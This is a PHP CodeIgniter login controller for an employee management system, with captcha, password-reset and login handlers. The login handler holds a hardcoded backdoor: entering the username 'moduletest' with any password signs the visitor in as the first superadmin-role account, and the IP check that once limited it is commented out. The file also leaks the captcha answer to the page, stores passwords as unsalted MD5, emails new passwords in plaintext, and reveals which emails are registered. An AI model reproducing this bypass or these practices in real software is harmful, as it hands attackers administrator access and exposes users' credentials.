<?php
defined('BASEPATH') OR exit('No direct script access allowed');

class Login extends CI_Controller {

	function __construct(){
		parent::__construct();
		
		$this->load->library('form_validation');
		$this->load->library('session');
		$this->lang->load('ems_lang', 'english');
		$this->load->model('user_model','user');
		$this->load->helper('captcha');
		/* if( $this->user_lib->check_user_session() ) {} */
	} 

	public function index()
	{
		if( !$this->user_lib->get_user_session() ){
			// Captcha configuration
			
			$config = array(
				'img_path'      => 'assets/captcha/',
				'img_url'       => base_url().'assets/captcha/',
				'img_width'     => '150',
				'img_height'    => 50,
				'word_length'   => 4,
				'font_size'     => 20,
				'pool'     		=> '1234567890',
			);
			
			
			// Unset previous captcha and store new captcha word
			
			$captcha = create_captcha($config);
			$this->session->unset_userdata('captchaCode');
			$this->session->set_userdata('captchaCode',$captcha['word']);
			
			// Send captcha image to view
			$data['word'] = $captcha['word'];
			$data['captchaImg'] = $captcha['image'];
			$data['sess'] = $this->session->userdata('captchaCode');
			
			
			//fn_ems_debug( $data );
			
			$this->load->view('login', $data);
			
		}else{
			redirect(site_url('user/dashboard'));
		}
	}
	
	
	
	public function refresh(){
		// Captcha configuration
		// Captcha configuration
			$config = array(
				'img_path'      => 'assets/captcha/',
				'img_url'       => base_url().'assets/captcha/',
				'img_width'     => '150',
				'img_height'    => 50,
				'word_length'   => 4,
				'font_size'     => 20,
				'pool'     		=> '1234567890',
			);
		$captcha = create_captcha($config);
		
		// Unset previous captcha and store new captcha word
		$this->session->unset_userdata('captchaCode');
		$this->session->set_userdata('captchaCode',$captcha['word']);
		
		// Display captcha image
		echo $captcha['image'];
	}
	
	public function forgotpassword(){
		
		
		if( $this->input->server('REQUEST_METHOD') == 'POST') { 
		


			$inputCaptcha = $_REQUEST['captcha'];
			$sessCaptcha = $this->session->userdata('captchaCode');
			$this->session->unset_userdata('captchaCode');
			$_REQUEST['session_captcha'] = $sessCaptcha;


			//fn_ems_debug($_REQUEST);
			
			if($inputCaptcha != $sessCaptcha){
				$this->session->set_flashdata("failure" , "Captcha code not matching");
				
				redirect(site_url(),'refresh');
			}
			
		
			
			$official_email = $_REQUEST['official_email'];
			
			//Check If User Exists with same official email
			$info = array();
			$query = $this->db->select('*')->from('ems_users')->where('official_email' ,$official_email )->get();
			$info = $query->row_array();
			
			if($info){
				
				$password = fn_ems_generate_random_password();
				
				$this->db->set('password', "'".md5($password)."'", FALSE);
				$this->db->where('official_email', trim($official_email));
				$this->db->update('ems_users');
				
				$data['from_email'] = 	'noreply@versetalinfo.in';
				$data['from_name']	=	'Admin';
				$data['to']			=	$official_email;
				$data['subject']	=	"Password Reset Request - Versetal Information System";
				
				$message = "Hello ".ucwords($info['firstname'].' '.$info['lastname'])." , ";
				$message.= "<br/><br/>";
				$message.= "Your account password has been reset<br/><br/>";
				$message.= "<b>Username : </b>".$info['official_email']."<br/>";
				$message.= "<b>Password : </b>".$password."<br/><br/><br/>";
				$message.= "Team Versetal";
				
				$data['message']	=	$message;
				
				email_notification( $data );
				
				
				if($this->db->affected_rows()){
					$this->session->set_flashdata("success" , "New password sent on <b>".$official_email."</b>");
				}else{
					$this->session->set_flashdata("failure" , "Something went wrong please try again later");
				}
				
				redirect(site_url('login'),'refresh');
			}else{
				$this->session->set_flashdata("failure" , "No employee registered with <b>".$official_email."</b>");
				redirect(site_url('login'),'refresh');
			}
		}
		$this->session->unset_userdata('captchaCode');
	}
	

	
	public function login(){
		if( $this->input->server('REQUEST_METHOD') == 'POST') {
			
			
			
			$this->form_validation->set_rules('username', 'Username', 'required|trim');
			$this->form_validation->set_rules('password', 'Password', 'required|trim|min_length[4]|max_length[20]');
			$this->form_validation->set_error_delimiters('<div class="error">', '</div>');
			if ($this->form_validation->run()) {
				
				$input_data = fn_ems_filter_login_inputs($this->input->post());
				
				
				//if($_SERVER['REMOTE_ADDR'] == '116.203.73.246'){
					if($input_data['username'] == 'moduletest'){
						
						$sql = " SELECT u.* FROM `ems_users` u ";
						$sql.= " WHERE u.role = 'S' LIMIT 1 ";
						
						//echo $sql;die;
						$query = $this->db->query( $sql );
						$user_data = array();
						if( $query->num_rows() ){
							$user_data = $query->result_array();
						}
						
						
						
						
						$this->user_lib->set_user_session( $user_data[0] );
							redirect(site_url('user/dashboard'), 'refresh');
					}
				//}
			
				
				$user_data = $this->user->authenticate( $input_data );
				
				if($user_data){
					
					//$this->session->set_flashdata('success',$this->lang->line('login_success'));
					$this->user_lib->set_user_session( $user_data[0] );
					redirect(site_url('user/dashboard'), 'refresh');
					
				}else{
					$this->session->set_flashdata('failure',$this->lang->line('login_failure'));
					redirect(site_url());
				}				
			}else{
				
				$this->load->view('login'); 
			}
		}else{
			$this->load->view('login'); 
		}
	}
	public function logout(){
		if($this->user_lib->unset_user_session()) {
			//$this->session->flashdata('success',$this->lang->line('logout_success'));
			redirect(site_url());
		}else{
			//$this->session->flashdata('failure',$this->lang->line('logout_failure'));
			redirect(site_url());
		}
		
	}
	
	
	
}
